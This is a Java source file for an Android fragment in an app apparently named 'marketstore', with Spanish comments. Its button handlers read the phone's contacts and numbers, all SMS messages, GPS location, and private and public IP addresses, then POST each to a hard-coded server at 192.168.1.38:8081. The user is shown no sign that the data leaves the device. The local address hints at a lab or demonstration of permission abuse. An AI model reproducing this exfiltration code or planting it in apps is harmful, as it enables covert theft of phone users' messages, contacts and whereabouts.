package com.imf.marketstore.ui.dashboard;

import android.annotation.SuppressLint;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;
import android.support.annotation.NonNull;
import android.support.v4.app.Fragment;
import android.arch.lifecycle.ViewModelProvider;

import com.imf.marketstore.databinding.FragmentDashboardBinding;

import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import java.util.ArrayList;
import java.util.List;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import java.util.ArrayList;
import java.util.List;
import android.Manifest;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;


//Camera GPS

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.Fragment;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;
import android.widget.Toast;

//IP Address
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import java.util.ArrayList;
import java.util.List;

//POST Service Web
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DashboardFragment extends Fragment {

    private FragmentDashboardBinding binding;
    private static final int MY_PERMISSIONS_REQUEST_READ_CONTACTS = 1;
    private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 2;
    private static final int REQUEST_IMAGE_CAPTURE = 3;
    private static final int REQUEST_LOCATION_PERMISSION = 4;

    private static final String TAG = DashboardFragment.class.getSimpleName();

    private LocationManager locationManager;
    private LocationListener locationListener;

    final String urlInfo = "http://192.168.1.38:8081/info";

    public View onCreateView(@NonNull LayoutInflater inflater,
                             ViewGroup container, Bundle savedInstanceState) {
        DashboardViewModel dashboardViewModel =
                new ViewModelProvider(this, new ViewModelProvider.NewInstanceFactory()).get(DashboardViewModel.class);

        binding = FragmentDashboardBinding.inflate(inflater, container, false);
        View root = binding.getRoot();

        //final TextView textView = binding.textDashboard;
        //dashboardViewModel.getText().observe(getViewLifecycleOwner(), textView::setText);

        binding.getContacts.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Verifica si el permiso ya ha sido concedido
                if (ContextCompat.checkSelfPermission(requireActivity(),
                        Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    // Si el permiso no ha sido concedido, solicítalo
                    ActivityCompat.requestPermissions(requireActivity(),
                            new String[]{Manifest.permission.READ_CONTACTS},
                            MY_PERMISSIONS_REQUEST_READ_CONTACTS);
                } else {
                    // Si el permiso ya ha sido concedido, accede a los contactos
                    accessContacts();
                }
            }
        });

        binding.getSms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Verifica si el permiso ya ha sido concedido
                if (ContextCompat.checkSelfPermission(requireActivity(),
                        Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                    // Si el permiso no ha sido concedido, solicítalo
                    ActivityCompat.requestPermissions(requireActivity(),
                            new String[]{Manifest.permission.READ_SMS},
                            MY_PERMISSIONS_REQUEST_READ_SMS);
                } else {
                    // Si el permiso ya ha sido concedido, accede a los SMS
                    accessSMS();
                }
            }
        });

        binding.getIpaddress.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Verifica si el permiso ya ha sido concedido
                String ipAddress = getIpAddress();
                Log.d("PermissionsActivity", "Private - IPAddress: "+ipAddress);
                sendPostInfo(urlInfo, "Private - IPAddress: "+ipAddress);

                getPublicIPAddress(new OnTaskCompleted() {
                    @Override
                    public void onTaskCompleted(String result) {
                        if (result != null) {
                            // La dirección IP pública se ha obtenido correctamente
                            Log.d("PublicIPAddress", "Public IP Address: " + result);
                            sendPostInfo(urlInfo, "Public IP Address: " + result);
                        } else {
                            // No se pudo obtener la dirección IP pública
                            Log.e("PublicIPAddress", "Failed to get Public IP Address");
                        }
                    }
                });
            }
        });

        binding.getLocation.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // Verifica si el permiso ya ha sido concedido
                if (ContextCompat.checkSelfPermission(requireActivity(),
                        Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    // Si el permiso no ha sido concedido, solicítalo
                    ActivityCompat.requestPermissions(requireActivity(),
                            new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
                            REQUEST_LOCATION_PERMISSION);
                } else {
                    // Si el permiso ya ha sido concedido, accede a las coordenadas
                    getLocation();
                }
            }
        });

        return root;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        binding = null;
    }

    private void accessContacts() {
        List<String> contactsList = new ArrayList<>();

        // Query contacts
        List<String> contacts = getContactsNumbers(requireContext());

        // Print contacts
        Log.d("PermissionsActivity", "Contacts:");
        String contactsToSend = "";
        for (String contact : contacts) {
            Log.d("Contact", contact);
            contactsToSend += contact + " ";
        }
        sendPostInfo(urlInfo, contactsToSend);

    }

    public static List<String> getContactsOld(Context context) {
        List<String> contactsList = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                if(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME) >= 0) {
                    @SuppressLint("Range") String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    contactsList.add(contactName);
                }
            }
            cursor.close();
        }
        return contactsList;
    }

    @SuppressLint("Range")
    public static List<String> getContactsNumbers(Context context) {
        List<String> contactsList = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                @SuppressLint("Range") String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                @SuppressLint("Range") String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                // Verificar si el contacto tiene al menos un número de teléfono
                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    // Obtener los números de teléfono del contacto
                    Cursor phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null);
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            // Crear un nuevo objeto Contact con el nombre y el número de teléfono
                            String contact = contactName + " : " + phoneNumber + ", ";
                            contactsList.add(contact);
                        }
                        phoneCursor.close();
                    }
                }
            }
            cursor.close();
        }
        return contactsList;
    }

    private void accessSMS() {
        List<String> smsList = getSMS(requireContext());

        // Print SMS
        Log.d("PermissionsActivity", "SMS:");
        String smsToSend = "";
        for (String sms : smsList) {
            Log.d("PermissionsActivity", sms);
            smsToSend += sms + " ";
        }
        sendPostInfo(urlInfo, smsToSend);
    }

    public static List<String> getSMS(Context context) {
        List<String> smsList = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = Uri.parse("content://sms");

        Cursor cursor = contentResolver.query(uri, null, null, null, null);
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String smsSender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String smsBody = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                smsList.add("From: " + smsSender + ", Body: " + smsBody);
            }
            cursor.close();
        }
        return smsList;
    }

    //Camara - Photo:

    private void requestCameraPermission() {
        if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(requireActivity(), new String[]{Manifest.permission.CAMERA}, REQUEST_IMAGE_CAPTURE);
        } else {
            dispatchTakePictureIntent();
        }
    }

    private void dispatchTakePictureIntent() {
        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (takePictureIntent.resolveActivity(requireActivity().getPackageManager()) != null) {
            startActivityForResult(takePictureIntent, REQUEST_IMAGE_CAPTURE);
        }
    }

    private void requestLocationPermission() {
        if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(requireActivity(), new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION_PERMISSION);
        } else {
            getLocation();
        }
    }

    private void getLocation() {
        // Verifica si el permiso de ubicación está concedido
        if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // Si el permiso no está concedido, solicita permiso
            ActivityCompat.requestPermissions(requireActivity(), new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION_PERMISSION);
        } else {
            // Si el permiso está concedido, obtén la ubicación
            locationManager = (LocationManager) requireActivity().getSystemService(Context.LOCATION_SERVICE);
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    // Actualiza la interfaz de usuario con la ubicación
                    updateLocationUI(location);
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}

                @Override
                public void onProviderEnabled(String provider) {}

                @Override
                public void onProviderDisabled(String provider) {
                    // Si el proveedor de ubicación está deshabilitado, solicita al usuario que lo habilite
                    Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                    startActivity(intent);
                }
            };

            // Registra el LocationListener para recibir actualizaciones de ubicación
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3600000, 4000, locationListener);
        }
    }

    private void updateLocationUI(Location location) {
        if (location != null) {
            String latitude = String.valueOf(location.getLatitude());
            String longitude = String.valueOf(location.getLongitude());
            String accuracy = String.valueOf(location.getAccuracy());

            String locationText = "Latitud: " + latitude + "\nLongitud: " + longitude + "\nPrecisión: " + accuracy;
            Log.d("Location", "Location: "+locationText);
            sendPostInfo(urlInfo,"Location: "+locationText);

        } else {
            Log.d("Location", "Error to obtain location");
        }
    }

    private String getIpAddress(){
        try {
            // Obtener todas las interfaces de red del dispositivo
            Enumeration<NetworkInterface> enumNetworkInterfaces = NetworkInterface.getNetworkInterfaces();

            // Iterar sobre las interfaces de red
            while (enumNetworkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = enumNetworkInterfaces.nextElement();
                // Obtener las direcciones IP asociadas con la interfaz de red actual
                Enumeration<InetAddress> enumInetAddress = networkInterface.getInetAddresses();
                // Iterar sobre las direcciones IP de la interfaz de red actual
                while (enumInetAddress.hasMoreElements()) {
                    InetAddress inetAddress = enumInetAddress.nextElement();
                    // Verificar si la dirección IP no es una dirección IP local y si es una dirección IPv4
                    if (!inetAddress.isLoopbackAddress() && inetAddress.getAddress().length == 4) {
                        // Devolver la dirección IP como una cadena de texto
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        // En caso de no poder obtener la dirección IP, devolver null
        return null;
    }

    public static void getPublicIPAddress(OnTaskCompleted listener) {
        new AsyncTask<Void, Void, String>() {
            @Override
            protected String doInBackground(Void... voids) {
                HttpURLConnection urlConnection = null;
                BufferedReader reader = null;
                String ipAddress = null;

                try {
                    // URL del servicio para obtener la IP pública
                    URL url = new URL("https://api.ipify.org?format=json");

                    // Establecer la conexión HTTP
                    urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setRequestMethod("GET");
                    urlConnection.connect();

                    // Leer la respuesta del servicio
                    StringBuilder response = new StringBuilder();
                    reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }

                    // Convertir la respuesta JSON a una cadena de texto
                    ipAddress = response.toString();
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    // Cerrar la conexión y el lector de entrada
                    if (urlConnection != null) {
                        urlConnection.disconnect();
                    }
                    if (reader != null) {
                        try {
                            reader.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }

                return ipAddress;
            }

            @Override
            protected void onPostExecute(String result) {
                super.onPostExecute(result);
                if (listener != null) {
                    listener.onTaskCompleted(result);
                }
            }
        }.execute();
    }

    public interface OnTaskCompleted {
        void onTaskCompleted(String result);
    }

    public static void sendPostRequest(String urlString, String jsonBody, OnTaskCompleted listener) {
        //urlString = "http://localhost:8081/info";
        new AsyncTask<Void, Void, String>() {
            @Override
            protected String doInBackground(Void... voids) {
                HttpURLConnection urlConnection = null;
                BufferedReader reader = null;
                String response = null;

                try {
                    // Crear la URL
                    URL url = new URL(urlString);

                    // Abrir la conexión HTTP
                    urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setRequestMethod("POST");
                    urlConnection.setDoOutput(true); // Permitir el envío de datos
                    urlConnection.setRequestProperty("Content-Type", "text/plain"); // Especificar el tipo de contenido JSON

                    // Escribir el cuerpo JSON en el OutputStream
                    OutputStream outputStream = urlConnection.getOutputStream();
                    outputStream.write(jsonBody.getBytes());
                    outputStream.flush();
                    outputStream.close();

                    // Leer la respuesta del servidor
                    reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        stringBuilder.append(line);
                    }
                    response = stringBuilder.toString();
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    // Cerrar la conexión y el lector de entrada
                    if (urlConnection != null) {
                        urlConnection.disconnect();
                    }
                    if (reader != null) {
                        try {
                            reader.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }

                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                super.onPostExecute(result);
                if (listener != null) {
                    listener.onTaskCompleted(result);
                }
            }
        }.execute();
    }

    public void sendPostInfo(String url, String jsonBody){
        sendPostRequest(url, jsonBody, new OnTaskCompleted() {
            @Override
            public void onTaskCompleted(String result) {
                if (result != null) {
                    // La solicitud POST se realizó con éxito, puedes procesar la respuesta del servidor aquí
                    Log.d("POSTResponse", "Response from server: " + result);
                } else {
                    // La solicitud POST falló
                    Log.e("POSTResponse", "Failed to send POST request");
                }
            }
        });
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_IMAGE_CAPTURE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                dispatchTakePictureIntent();
            } else {
                Toast.makeText(requireContext(), "Permiso de cámara denegado", Toast.LENGTH_SHORT).show();
            }
        } else if (requestCode == REQUEST_LOCATION_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                getLocation();
            } else {
                Toast.makeText(requireContext(), "Permiso de ubicación denegado", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
